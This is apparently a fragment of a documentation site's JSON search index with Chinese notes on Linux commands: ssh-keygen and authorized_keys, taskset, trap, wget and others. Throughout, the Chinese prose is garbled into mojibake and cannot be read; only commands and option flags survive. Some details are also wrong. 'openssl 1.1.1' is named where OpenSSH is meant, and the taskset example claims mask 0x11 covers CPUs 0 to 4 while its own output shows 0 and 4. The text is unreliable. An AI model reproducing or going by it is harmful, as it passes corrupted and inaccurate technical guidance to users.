åœ¨ç‰ˆæœ¬3ä¹‹å‰çš„OpenSSHä¸­ï¼Œsshdæ‰‹å†Œé¡µæ›¾ç»è¯´è¿‡ï¼š > $ HOME / .ssh / authorized_keysæ–‡ä»¶åˆ—å‡ºäº†SSHåè®®1.3å’Œ1.5ä¸­å…è®¸è¿›è¡ŒRSAèº«ä»½éªŒè¯çš„RSAå¯†é’¥ã€‚ ç±»ä¼¼åœ°ï¼Œ$ HOME / .ssh / authorized_keys2æ–‡ä»¶åˆ—å‡ºäº†å…è®¸è¿›è¡Œå…¬å…±å¯†é’¥èº«ä»½éªŒè¯çš„DSAå’ŒRSAå¯†é’¥ï¼ˆ SSHåè®®2.0ä¸­çš„PubkeyAuthenticationï¼‰ã€‚ ç‰ˆæœ¬3 çš„ å‘è¡Œå…¬å‘Š æŒ‡å‡ºå·²å¼ƒç”¨authorized_keys2ï¼Œå¹¶ä¸”æ‰€æœ‰å¯†é’¥éƒ½åº”æ”¾åœ¨authorized_keysæ–‡ä»¶ä¸­ã€‚ å®é™…ä½¿ç”¨è¿‡ç¨‹ä¸­openssl 1.1.1çš„ç‰ˆæœ¬ä¸­å³ä½¿åªæœ‰ä¸€ä¸ªauthorized_keys2ä¹Ÿå¯ä»¥ä½¿ç”¨çš„ï¼ˆå…¶ä»–ç‰ˆæœ¬æœªæµ‹è¯•ï¼‰ ç™»å½•æ‰§è¡ŒæŒ‡ä»¤ åœ¨å…¬é’¥æ–‡ä»¶å‰åŠ ä¸Š: command=\"/bin/sh xxx.sh\" $pub_key å…³äºrsaæ ¼å¼ç§˜é’¥åœ¨é«˜ç‰ˆæœ¬çš„ç”Ÿæˆ ç°åœ¨ä½¿ç”¨å‘½ä»¤ ssh-keygen -t rsa ç”Ÿæˆsshï¼Œé»˜è®¤æ˜¯ä»¥æ–°çš„æ ¼å¼ç”Ÿæˆï¼Œ id_rsaçš„ç¬¬ä¸€è¡Œå˜æˆäº† \"BEGIN OPENSSH PRIVATE KEY\" è€Œä¸åœ¨æ˜¯ \"BEGIN RSA PRIVATE KEY\" ï¼Œ æ­¤æ—¶ç”¨æ¥msyqlã€MongoDBï¼Œé…ç½®sshç™»é™†çš„è¯ï¼Œ å¯èƒ½ä¼šæŠ¥ \"Resource temporarily unavailable. Authentication by key (/Users/youname/.ssh/id_rsa) failed (Error -16). (Error #35)\" æç¤ºèµ„æºä¸å¯ç”¨ï¼Œè¿™å°±æ˜¯id_rsa æ ¼å¼ä¸å¯¹é€ æˆçš„ è§£å†³æ–¹æ³•ï¼ˆä¸€ï¼‰ï¼š ä½¿ç”¨ ssh-keygen -m PEM -t rsa -b 4096 æ¥ç”Ÿæˆ æ³¨è§£ -m PEM æŒ‡å®šå¯†é’¥çš„æ ¼å¼ï¼ŒPEMï¼ˆä¹Ÿå°±æ˜¯RSAæ ¼å¼ï¼‰æ˜¯ä¹‹å‰ä½¿ç”¨çš„æ—§æ ¼å¼ -b 4096 æŒ‡å®šå¯†é’¥é•¿åº¦ä¸º4096 -t rsa æŒ‡å®šè¦åˆ›å»ºçš„å¯†é’¥ç±»å‹ä¸ºRSA åŸæ–‡é“¾æ¥ï¼š https://blog.csdn.net/lsp84ch80/article/details/87861990","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ssh-keygen.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ssh-keygen.html"},{"title":"stdbuf","text":"è¯»å–ç®¡é“æ–‡ä»¶ -i è°ƒæ•´æ ‡å‡†è¾“å…¥æµç¼“å†²åŒº -o è°ƒæ•´æ ‡å‡†è¾“å‡ºæµç¼“å†²åŒº -e æ ‡å‡†é”™è¯¯æµç¼“å†²åŒº L è¡Œç¼“å†²æ¨¡å¼","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-stdbuf.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-stdbuf.html"},{"title":"tail","text":"æ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶çš„æœ«å°¾è‹¥å¹²è¡Œ -n<N>, â€”â€”line=<N> è¾“å‡ºæ–‡ä»¶çš„å°¾éƒ¨Nï¼ˆNä½æ•°å­—ï¼‰è¡Œå†…å®¹ -f æ˜¾ç¤ºæœ€æ–°å†…å®¹","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-tail.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-tail.html"},{"title":"taskset","text":"tasksetå‘½ä»¤ç”¨äºè®¾ç½®è¿›ç¨‹ï¼ˆæˆ– çº¿ç¨‹ï¼‰çš„å¤„ç†å™¨äº²å’Œæ€§ï¼ˆProcessor Affinityï¼‰ï¼Œ å¯ä»¥å°†è¿›ç¨‹ï¼ˆæˆ– çº¿ç¨‹ï¼‰ç»‘å®šåˆ°ç‰¹å®šçš„ä¸€ä¸ª æˆ– å¤šä¸ªCPUä¸Šå»æ‰§è¡Œï¼Œ è€Œä¸å…è®¸å°†è¿›ç¨‹ï¼ˆæˆ– çº¿ç¨‹ï¼‰è°ƒåº¦åˆ°å…¶ä»–çš„CPUä¸Šã€‚ å°†è¿›ç¨‹ç»‘å®šåˆ°æŒ‡å®šçš„CPUä¸Šè¿è¡Œï¼Œè¿™æ ·å¯ä»¥é¿å…å¤§é‡çš„è¿›ç¨‹åˆ‡æ¢äº§ç”Ÿçš„æ— æ•ˆæ—¶é—´ã€‚ é€šè¿‡ taskset å‘½ä»¤å¯å°†æŸä¸ªè¿›ç¨‹ä¸æŸä¸ªCPUæ ¸å¿ƒç»‘å®šï¼Œä½¿å¾—å…¶ä»…åœ¨ä¸ä¹‹ç»‘å®šçš„CPUæ ¸å¿ƒä¸Šè¿è¡Œã€‚ çº¿ç¨‹æ˜¯æœ€å°çš„å†…æ ¸æ‰§è¡Œè°ƒåº¦å•å…ƒï¼Œå› æ­¤ï¼Œå‡†ç¡®åœ°è¯´æ˜¯å°†æŸä¸ªçº¿ç¨‹ä¸æŸä¸ªCPUæ ¸å¿ƒç»‘å®šï¼Œè€ŒéæŸä¸ªè¿›ç¨‹ã€‚ tasksetå‘½ä»¤æ˜¯ä¾æ®çº¿ç¨‹PIDï¼ˆTIDï¼‰æŸ¥è¯¢æˆ–è®¾ç½®çº¿ç¨‹çš„CPUäº²å’Œæ€§ï¼ˆä¸å“ªä¸ªCPUæ ¸å¿ƒç»‘å®šï¼‰ã€‚ å¸¸ç”¨å‚æ•° -a , --all-tasks è®¾ç½®æˆ–æ£€ç´¢æ‰€æœ‰ä»»åŠ¡ï¼ˆçº¿ç¨‹ï¼‰çš„CPUç›¸å…³æ€§å¯¹äºç»™å®šçš„PID -c , --cpu-list å°†æ©ç è§£é‡Šä¸ºå¤„ç†å™¨çš„æ•°å­—åˆ—è¡¨ -p , --pid åœ¨ç°æœ‰PIDä¸Šæ“ä½œï¼Œä¸è¦å¯åŠ¨æ–°ä»»åŠ¡ -V , --version æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ -h , --help æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ ä¾‹å­: [root@localhost ~]# ps -eLf | grep qemu root 1389 1339 1389 0 3 14:48 pts/0 00:00:10 /usr/libexec/qemu-kvm -cpu SandyBridge -vnc 0.0.0.0:1 centos1708.img root 1389 1339 1393 2 3 14:48 pts/0 00:00:36 /usr/libexec/qemu-kvm -cpu SandyBridge -vnc 0.0.0.0:1 centos1708.img root 1389 1339 1395 0 3 14:48 pts/0 00:00:00 /usr/libexec/qemu-kvm -cpu SandyBridge -vnc 0.0.0.0:1 centos1708.img root 2638 1409 2638 0 1 15:10 pts/1 00:00:00 grep --color=auto qemu [root@localhost ~]# taskset -p 1393 pid 1393's current affinity mask: ff [root@localhost ~]# taskset -p 1389 pid 1389's current affinity mask: ff è¾“å‡ºç»“æ„å¤„ç†å™¨äº²å’Œæ€§æ©ç æ˜¯ffï¼Œè¡¨ç¤ºè¿›ç¨‹ï¼ˆæˆ– çº¿ç¨‹ï¼‰å¯ä»¥åœ¨Hostä¸Šè®©ä»»ä½•ä¸€ä¸ªCPUè¿è¡Œã€‚ æŸ¥çœ‹è¿›ç¨‹ï¼ˆæˆ– çº¿ç¨‹ï¼‰å…è®¸å…è®¸CPUèŒƒå›´ä½¿ç”¨ -c å‚æ•°ã€‚ ç”±äºæˆ‘çš„Host CPUæ˜¯4æ ¸2çº¿ç¨‹ï¼Œå› æ­¤æœ‰8é¢—é€»è¾‘CPU: [root@localhost ~]# taskset -cp 1393 pid 1393's current affinity list: 0-7 [root@localhost ~]# taskset -cp 1389 pid 1389's current affinity list: 0-7 æ›´æ”¹å…·ä½“æŸä¸€è¿›ç¨‹ï¼ˆæˆ– çº¿ç¨‹ï¼‰CPUäº²å’Œæ€§ æŒ‡ä»¤: taskset -p hexadecimal mask PID/LWP ä¸Šé¢1393å·çº¿ç¨‹å¯ä»¥åœ¨0~7å·CPUä¹‹é—´å…è®¸ï¼Œç°åœ¨è®¾ç½®æ©ç 0x11ï¼ˆäºŒè¿›åˆ¶0001 0001ï¼‰ï¼Œè¡¨ç¤ºå¯ä»¥åœ¨0~4å·CPUä¸Šå…è®¸: [root@localhost ~]# taskset -p 0x11 1393 pid 1393's current affinity mask: ff pid 1393's new affinity mask: 11 [root@localhost ~]# taskset -p 1393 pid 1393's current affinity mask: 11 [root@localhost ~]# taskset -cp 1393 pid 1393's current affinity list: 0,4 ä¸ºå…·ä½“æŸä¸€è¿›ç¨‹ï¼ˆæˆ– çº¿ç¨‹ï¼‰CPUäº²å’Œæ€§æŒ‡å®šä¸€ç»„èŒƒå›´ ä½¿ç”¨-cå‚æ•°: [root@localhost ~]# taskset -cp 0,3 1393 pid 1393's current affinity list: 0,4 pid 1393's new affinity list: 0,3 [root@localhost ~]# taskset -cp 1393 pid 1393's current affinity list: 0,3","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-taskset.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-taskset.html"},{"title":"trap","text":"æŒ‡å®šåœ¨æ¥æ”¶åˆ°ä¿¡å·ä¹‹åå°†è¦é‡‡å–çš„åŠ¨ä½œ ç”¨æ³•: trap \"åŠ¨ä½œ\" \"ä¿¡å·\" æ”¯æŒçš„ä¿¡å·è§: /docs/æ“ä½œç³»ç»Ÿ/linux/æ¦‚å¿µæ€§/linuxç³»ç»Ÿä¿¡å· ä¾‹å¦‚ï¼Œæ”¶åˆ°0ä¿¡å·æ‰§è¡Œ exit 1 trap \"exit 1\" 0 ä¸setåä½œ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/set æ”¯æŒåœ¨è„šæœ¬æ‰§è¡Œé”™è¯¯æ—¶é€€å‡º, é‚£å¦‚æœè¦åœ¨é€€å‡ºæ—¶å€™æ‰“å°ä¸€äº›æ¶ˆæ¯æˆ–è€…æ¸…ç†åº”è¯¥å¦‚ä½•åš? set -e åœ¨æ£€æŸ¥åˆ°å‘½ä»¤å¼‚å¸¸è¿”å›æ—¶å¹¶æ²¡æœ‰ä¿¡å·çš„äº§ç”Ÿ, æ•…trapæŒ‡ä»¤å°±ä¸èƒ½å†™ä¿¡å·äº†, è€Œæ˜¯å†™bashå†…ç½®å®šä¹‰çš„ ERR (ä¸åŒºåˆ†å¤§å°å†™): #!/bin/bash error_exit() { echo \"error, exit\" } set -e trap error_exit ERR echo 1 ss echo 2 echo 3 æ³¨è§£ dashä¸­è²Œä¼¼æ²¡æœ‰å†…ç½®å¯¹ERRçš„æ”¯æŒ å¯¹ERRçš„è¯´æ˜: åœ¨ Bash ä¸­ï¼ŒERR å¹¶ä¸æ˜¯ä¸€ä¸ªå…·ä½“çš„ä¿¡å·ã€‚åœ¨é”™è¯¯æ£€æµ‹æœºåˆ¶ä¸­ï¼ŒERR æ˜¯å¯¹å‘ç”Ÿé”™è¯¯é€€å‡ºçš„çŠ¶æ€çš„å¼•ç”¨. è™½ç„¶ ERR ä¸æ˜¯ä¸€ä¸ªå®é™…çš„ä¿¡å·ï¼Œä½†å®ƒå¯ä»¥è¢« trap å‘½ä»¤æ•è·å’Œå¤„ç†.","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-trap.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-trap.html"},{"title":"userdel","text":"-f å¼ºåˆ¶åˆ é™¤ å³ä½¿ç™»é™† -r åˆ é™¤æ—¶ åˆ é™¤æ‰€æœ‰ç›¸å…³æ–‡ä»¶","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-userdel.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-userdel.html"},{"title":"watch","text":"å‘¨æœŸæ‰§è¡Œç»™å®šçš„æŒ‡ä»¤: watch ï¼ˆé€‰é¡¹ï¼‰ ï¼ˆå‚æ•°ï¼‰ é€‰é¡¹ -n , --interval watchç¼ºçœæ¯2ç§’è¿è¡Œä¸€ä¸‹ç¨‹åºï¼Œå¯ä»¥ç”¨-næˆ–-intervalæ¥æŒ‡å®šé—´éš”çš„æ—¶é—´ã€‚ -d , --differences ç”¨-dæˆ–--differences é€‰é¡¹watch ä¼šé«˜äº®æ˜¾ç¤ºå˜åŒ–çš„åŒºåŸŸã€‚ è€Œ-d=cumulativeé€‰é¡¹ä¼šæŠŠå˜åŠ¨è¿‡çš„åœ°æ–¹(ä¸ç®¡æœ€è¿‘çš„é‚£æ¬¡æœ‰æ²¡æœ‰å˜åŠ¨)éƒ½é«˜äº®æ˜¾ç¤ºå‡ºæ¥ã€‚ -t , -n o-title ä¼šå…³é—­watchå‘½ä»¤åœ¨é¡¶éƒ¨çš„æ—¶é—´é—´éš”,å‘½ä»¤ï¼Œå½“å‰æ—¶é—´çš„è¾“å‡ºã€‚ -h , --help æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-watch.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-watch.html"},{"title":"wget","text":"ä»æŒ‡å®šçš„URLä¸‹è½½æ–‡ä»¶ã€‚ wgetéå¸¸ç¨³å®šï¼Œå®ƒåœ¨å¸¦å®½å¾ˆçª„çš„æƒ…å†µä¸‹å’Œä¸ç¨³å®šç½‘ç»œä¸­æœ‰å¾ˆå¼ºçš„é€‚åº”æ€§ï¼Œ å¦‚æœæ˜¯ç”±äºç½‘ç»œçš„åŸå› ä¸‹è½½å¤±è´¥ï¼Œwgetä¼šä¸æ–­çš„å°è¯•ï¼Œç›´åˆ°æ•´ä¸ªæ–‡ä»¶ä¸‹è½½å®Œæ¯•ã€‚ å¦‚æœæ˜¯æœåŠ¡å™¨æ‰“æ–­ä¸‹è½½è¿‡ç¨‹ï¼Œå®ƒä¼šå†æ¬¡è”åˆ°æœåŠ¡å™¨ä¸Šä»åœæ­¢çš„åœ°æ–¹ç»§ç»­ä¸‹è½½ã€‚ è¿™å¯¹ä»é‚£äº›é™å®šäº†é“¾æ¥æ—¶é—´çš„æœåŠ¡å™¨ä¸Šä¸‹è½½å¤§æ–‡ä»¶éå¸¸æœ‰ç”¨ã€‚ wgetæ”¯æŒHTTPï¼ŒHTTPSå’ŒFTPåè®®ï¼Œå¯ä»¥ä½¿ç”¨HTTPä»£ç†ã€‚ æ‰€è°“çš„è‡ªåŠ¨ä¸‹è½½æ˜¯æŒ‡ï¼Œwgetå¯ä»¥åœ¨ç”¨æˆ·é€€å‡ºç³»ç»Ÿçš„ä¹‹ååœ¨åå°æ‰§è¡Œã€‚ è¿™æ„å‘³è¿™ä½ å¯ä»¥ç™»å½•ç³»ç»Ÿï¼Œå¯åŠ¨ä¸€ä¸ªwgetä¸‹è½½ä»»åŠ¡ï¼Œç„¶åé€€å‡ºç³»ç»Ÿï¼Œ wgetå°†åœ¨åå°æ‰§è¡Œç›´åˆ°ä»»åŠ¡å®Œæˆï¼Œ ç›¸å¯¹äºå…¶å®ƒå¤§éƒ¨åˆ†æµè§ˆå™¨åœ¨ä¸‹è½½å¤§é‡æ•°æ®æ—¶éœ€è¦ç”¨æˆ·ä¸€ç›´çš„å‚ä¸ï¼Œè¿™çœå»äº†æå¤§çš„éº»çƒ¦ã€‚ ç”¨äºä»ç½‘ç»œä¸Šä¸‹è½½èµ„æºï¼Œæ²¡æœ‰æŒ‡å®šç›®å½•ï¼Œä¸‹è½½èµ„æºå›é»˜è®¤ä¸ºå½“å‰ç›®å½•ã€‚ wgetè™½ç„¶åŠŸèƒ½å¼ºå¤§ï¼Œä½†æ˜¯ä½¿ç”¨èµ·æ¥è¿˜æ˜¯æ¯”è¾ƒç®€å•ï¼š æ”¯æŒæ–­ç‚¹ä¸‹ä¼ åŠŸèƒ½ è¿™ä¸€ç‚¹ï¼Œä¹Ÿæ˜¯ç½‘ç»œèš‚èšå’ŒFlashGetå½“å¹´æœ€å¤§çš„å–ç‚¹ï¼Œ ç°åœ¨ï¼ŒWgetä¹Ÿå¯ä»¥ä½¿ç”¨æ­¤åŠŸèƒ½ï¼Œé‚£äº›ç½‘ç»œä¸æ˜¯å¤ªå¥½çš„ç”¨æˆ·å¯ä»¥æ”¾å¿ƒäº†ï¼› åŒæ—¶æ”¯æŒFTPå’ŒHTTPä¸‹è½½æ–¹å¼ å°½ç®¡ç°åœ¨å¤§éƒ¨åˆ†è½¯ä»¶å¯ä»¥ä½¿ç”¨HTTPæ–¹å¼ä¸‹è½½ï¼Œä½†æ˜¯ï¼Œæœ‰äº›æ—¶å€™ï¼Œä»ç„¶éœ€è¦ä½¿ç”¨FTPæ–¹å¼ä¸‹è½½è½¯ä»¶ï¼› æ”¯æŒä»£ç†æœåŠ¡å™¨ å¯¹å®‰å…¨å¼ºåº¦å¾ˆé«˜çš„ç³»ç»Ÿè€Œè¨€ï¼Œä¸€èˆ¬ä¸ä¼šå°†è‡ªå·±çš„ç³»ç»Ÿç›´æ¥æš´éœ²åœ¨äº’è”ç½‘ä¸Šï¼Œ æ‰€ä»¥ï¼Œæ”¯æŒä»£ç†æ˜¯ä¸‹è½½è½¯ä»¶å¿…é¡»æœ‰çš„åŠŸèƒ½ï¼› è®¾ç½®æ–¹ä¾¿ç®€å• å¯èƒ½ï¼Œä¹ æƒ¯å›¾å½¢ç•Œé¢çš„ç”¨æˆ·å·²ç»ä¸æ˜¯å¤ªä¹ æƒ¯å‘½ä»¤è¡Œäº†ï¼Œ ä½†æ˜¯ï¼Œå‘½ä»¤è¡Œåœ¨è®¾ç½®ä¸Šå…¶å®æœ‰æ›´å¤šçš„ä¼˜ç‚¹ï¼Œæœ€å°‘ï¼Œé¼ æ ‡å¯ä»¥å°‘ç‚¹å¾ˆå¤šæ¬¡ï¼Œä¹Ÿä¸è¦æ‹…å¿ƒæ˜¯å¦é”™ç‚¹é¼ æ ‡ï¼› ç¨‹åºå°ï¼Œå®Œå…¨å…è´¹ ç¨‹åºå°å¯ä»¥è€ƒè™‘ä¸è®¡ï¼Œå› ä¸ºç°åœ¨çš„ç¡¬ç›˜å®åœ¨å¤ªå¤§äº†ï¼› å®Œå…¨å…è´¹å°±ä¸å¾—ä¸è€ƒè™‘äº†ï¼Œå³ä½¿ç½‘ç»œä¸Šæœ‰å¾ˆå¤šæ‰€è°“çš„å…è´¹è½¯ä»¶ï¼Œä½†æ˜¯ï¼Œè¿™äº›è½¯ä»¶çš„å¹¿å‘Šå´ä¸æ˜¯æˆ‘ä»¬å–œæ¬¢çš„ã€‚ è¯­æ³• : wget [å‚æ•°] [URLåœ°å€] é€‰é¡¹ å¯åŠ¨å‚æ•°ï¼š -V, â€“-version æ˜¾ç¤ºwgetçš„ç‰ˆæœ¬åé€€å‡º -h, â€“-help æ‰“å°è¯­æ³•å¸®åŠ© -b, â€“-background å¯åŠ¨åè½¬å…¥åå°æ‰§è¡Œ -e, â€“-execute=COMMAND æ‰§è¡Œ .wgetrc æ ¼å¼çš„å‘½ä»¤ï¼Œ wgetrcæ ¼å¼å‚è§/etc/wgetrcæˆ–~/.wgetrc è®°å½•å’Œè¾“å…¥æ–‡ä»¶å‚æ•°ï¼š -o, â€“-output-file=FILE æŠŠè®°å½•å†™åˆ°FILEæ–‡ä»¶ä¸­ -a, â€“-append-output=FILE æŠŠè®°å½•è¿½åŠ åˆ°FILEæ–‡ä»¶ä¸­ -d, â€“-debug æ‰“å°è°ƒè¯•è¾“å‡º -q, â€“-quiet å®‰é™æ¨¡å¼(æ²¡æœ‰è¾“å‡º) -v, â€“-verbose å†—é•¿æ¨¡å¼(è¿™æ˜¯ç¼ºçœè®¾ç½®) -nv, â€“-non-verbose å…³æ‰å†—é•¿æ¨¡å¼ï¼Œä½†ä¸æ˜¯å®‰é™æ¨¡å¼ -i, â€“-input-file=FILE ä¸‹è½½åœ¨FILEæ–‡ä»¶ä¸­å‡ºç°çš„URLs -F, â€“-force-html æŠŠè¾“å…¥æ–‡ä»¶å½“ä½œHTMLæ ¼å¼æ–‡ä»¶å¯¹å¾… -B, â€“-base=URL å°†URLä½œä¸ºåœ¨-F -iå‚æ•°æŒ‡å®šçš„æ–‡ä»¶ä¸­å‡ºç°çš„ç›¸å¯¹é“¾æ¥çš„å‰ç¼€ â€“-sslcertfile=FILE å¯é€‰å®¢æˆ·ç«¯è¯ä¹¦ â€“-sslcertkey=KEYFILE å¯é€‰å®¢æˆ·ç«¯è¯ä¹¦çš„KEYFILE â€“-egd-file=FILE æŒ‡å®šEGD socketçš„æ–‡ä»¶å ä¸‹è½½å‚æ•°ï¼š â€“-bind-address=ADDRESS æŒ‡å®šæœ¬åœ°ä½¿ç”¨åœ°å€(ä¸»æœºåæˆ–IPï¼Œå½“æœ¬åœ°æœ‰å¤šä¸ªIPæˆ–åå­—æ—¶ä½¿ç”¨) -t, â€“-tries=NUMBER è®¾å®šæœ€å¤§å°è¯•é“¾æ¥æ¬¡æ•°(0 è¡¨ç¤ºæ— é™åˆ¶). -O â€“-output-document=FILE æŠŠæ–‡æ¡£å†™åˆ°FILEæ–‡ä»¶ä¸­ -nc, â€“-no-clobber ä¸è¦è¦†ç›–å­˜åœ¨çš„æ–‡ä»¶æˆ–ä½¿ç”¨.#å‰ç¼€ -c, â€“-continue æ¥ç€ä¸‹è½½æ²¡ä¸‹è½½å®Œçš„æ–‡ä»¶ â€“progress=TYPE è®¾å®šè¿›ç¨‹æ¡æ ‡è®° -N, â€“-timestamping ä¸è¦é‡æ–°ä¸‹è½½æ–‡ä»¶é™¤éæ¯”æœ¬åœ°æ–‡ä»¶æ–° -S, â€“-server-response æ‰“å°æœåŠ¡å™¨çš„å›åº” â€“-spider ä¸ä¸‹è½½ä»»ä½•ä¸œè¥¿ -T, â€“-timeout=SECONDS è®¾å®šå“åº”è¶…æ—¶çš„ç§’æ•° -w, â€“-wait=SECONDS ä¸¤æ¬¡å°è¯•ä¹‹é—´é—´éš”SECONDSç§’ â€“waitretry=SECONDS åœ¨é‡æ–°é“¾æ¥ä¹‹é—´ç­‰å¾…1â€¦SECONDSç§’ â€“random-wait åœ¨ä¸‹è½½ä¹‹é—´ç­‰å¾…0â€¦2*WAITç§’ -Y, â€“-proxy=on/off æ‰“å¼€æˆ–å…³é—­ä»£ç† -Q, â€“-quota=NUMBER è®¾ç½®ä¸‹è½½çš„å®¹é‡é™åˆ¶ â€“limit-rate=RATE é™å®šä¸‹è½½è¾“ç‡ ç›®å½•å‚æ•°ï¼š -nd â€“-no-directories ä¸åˆ›å»ºç›®å½• -x, â€“-force-directories å¼ºåˆ¶åˆ›å»ºç›®å½• -nH, â€“-no-host-directories ä¸åˆ›å»ºä¸»æœºç›®å½• -P, â€“-directory-prefix=PREFIX å°†æ–‡ä»¶ä¿å­˜åˆ°ç›®å½• PREFIX/â€¦ â€“cut-dirs=NUMBER å¿½ç•¥ NUMBERå±‚è¿œç¨‹ç›®å½• HTTP é€‰é¡¹å‚æ•°ï¼š -â€“http-user=USER è®¾å®šHTTPç”¨æˆ·åä¸º USER. -â€“http-passwd=PASS è®¾å®šhttpå¯†ç ä¸º PASS -C, â€“-cache=on/off å…è®¸/ä¸å…è®¸æœåŠ¡å™¨ç«¯çš„æ•°æ®ç¼“å­˜ (ä¸€èˆ¬æƒ…å†µä¸‹å…è®¸) -E, â€“-html-extension å°†æ‰€æœ‰text/htmlæ–‡æ¡£ä»¥.htmlæ‰©å±•åä¿å­˜ -â€“ignore-length å¿½ç•¥ Content-Length å¤´åŸŸ -â€“header=STRING åœ¨headersä¸­æ’å…¥å­—ç¬¦ä¸² STRING -â€“proxy-user=USER è®¾å®šä»£ç†çš„ç”¨æˆ·åä¸º USER -â€“proxy-passwd=PASS è®¾å®šä»£ç†çš„å¯†ç ä¸º PASS -â€“referer=URL åœ¨HTTPè¯·æ±‚ä¸­åŒ…å« Referer: URL å¤´ -s, â€“-save-headers ä¿å­˜HTTPå¤´åˆ°æ–‡ä»¶ -U, â€“-user-agent=AGENT è®¾å®šä»£ç†çš„åç§°ä¸º AGENTè€Œä¸æ˜¯ Wget/VERSION -â€“no-http-keep-alive å…³é—­ HTTPæ´»åŠ¨é“¾æ¥ (æ°¸è¿œé“¾æ¥) â€“-cookies=off ä¸ä½¿ç”¨ cookies â€“-load-cookies=FILE åœ¨å¼€å§‹ä¼šè¯å‰ä»æ–‡ä»¶ FILEä¸­åŠ è½½cookie -â€“save-cookies=FILE åœ¨ä¼šè¯ç»“æŸåå°† cookiesä¿å­˜åˆ° FILEæ–‡ä»¶ä¸­ FTP é€‰é¡¹å‚æ•°ï¼š -nr, -â€“dont-remove-listing ä¸ç§»èµ° .listing æ–‡ä»¶ -g, -â€“glob=on/off æ‰“å¼€æˆ–å…³é—­æ–‡ä»¶åçš„ globbingæœºåˆ¶ -â€“passive-ftp ä½¿ç”¨è¢«åŠ¨ä¼ è¾“æ¨¡å¼ (ç¼ºçœå€¼). -â€“active-ftp ä½¿ç”¨ä¸»åŠ¨ä¼ è¾“æ¨¡å¼ -â€“retr-symlinks åœ¨é€’å½’çš„æ—¶å€™ï¼Œå°†é“¾æ¥æŒ‡å‘æ–‡ä»¶(è€Œä¸æ˜¯ç›®å½•) é€’å½’ä¸‹è½½å‚æ•°ï¼š -r, -â€“recursive é€’å½’ä¸‹è½½ï¼ï¼æ…ç”¨! -l, -â€“level=NUMBER æœ€å¤§é€’å½’æ·±åº¦ (inf æˆ– 0 ä»£è¡¨æ— ç©·) â€“-delete-after åœ¨ç°åœ¨å®Œæ¯•åå±€éƒ¨åˆ é™¤æ–‡ä»¶ -k, â€“-convert-links è½¬æ¢éç›¸å¯¹é“¾æ¥ä¸ºç›¸å¯¹é“¾æ¥ -K, â€“-backup-converted åœ¨è½¬æ¢æ–‡ä»¶Xä¹‹å‰ï¼Œå°†ä¹‹å¤‡ä»½ä¸º X.orig -m, â€“-mirror ç­‰ä»·äº -r -N -l inf -nr -p, â€“-page-requisites ä¸‹è½½æ˜¾ç¤ºHTMLæ–‡ä»¶çš„æ‰€æœ‰å›¾ç‰‡ é€’å½’ä¸‹è½½ä¸­çš„åŒ…å«å’Œä¸åŒ…å«(accept/reject)ï¼š -A, â€“-accept=LIST åˆ†å·åˆ†éš”çš„è¢«æ¥å—æ‰©å±•åçš„åˆ—è¡¨ -R, â€“-reject=LIST åˆ†å·åˆ†éš”çš„ä¸è¢«æ¥å—çš„æ‰©å±•åçš„åˆ—è¡¨ -D, â€“-domains=LIST åˆ†å·åˆ†éš”çš„è¢«æ¥å—åŸŸçš„åˆ—è¡¨ â€“-exclude-domains=LIST åˆ†å·åˆ†éš”çš„ä¸è¢«æ¥å—çš„åŸŸçš„åˆ—è¡¨ â€“-follow-ftp è·Ÿè¸ªHTMLæ–‡æ¡£ä¸­çš„FTPé“¾æ¥ â€“-follow-tags=LIST åˆ†å·åˆ†éš”çš„è¢«è·Ÿè¸ªçš„HTMLæ ‡ç­¾çš„åˆ—è¡¨ -G, â€“-ignore-tags=LIST åˆ†å·åˆ†éš”çš„è¢«å¿½ç•¥çš„HTMLæ ‡ç­¾çš„åˆ—è¡¨ -H, â€“-span-hosts å½“é€’å½’æ—¶è½¬åˆ°å¤–éƒ¨ä¸»æœº -L, â€“-relative ä»…ä»…è·Ÿè¸ªç›¸å¯¹é“¾æ¥ -I, â€“-include-directories=LIST å…è®¸ç›®å½•çš„åˆ—è¡¨ -X, â€“-exclude-directories=LIST ä¸è¢«åŒ…å«ç›®å½•çš„åˆ—è¡¨ -np, â€“-no-parent ä¸è¦è¿½æº¯åˆ°çˆ¶ç›®å½• wget -S â€“-spider url ä¸ä¸‹è½½åªæ˜¾ç¤ºè¿‡ç¨‹ --limit-rate=300k é™åˆ¶å¸¦å®½ä¸º300k","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-wett.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-wett.html"},{"title":"whereis","text":"æŸ¥æ‰¾ç¯å¢ƒå˜é‡ä¸­çš„æ–‡ä»¶ -l åˆ—å‡ºwhereisä¼šå»æŸ¥è¯¢çš„å‡ ä¸ªç›®å½• -b åªæ‰¾binaryæ ¼å¼æ–‡ä»¶ -m åªæ‰¾åœ¨è¯´æ˜æ–‡ä»¶manualè·¯å¾„ä¸‹æ–‡ä»¶ -s åªæ‰¾sourceæ¥æºæ–‡ä»¶ -u 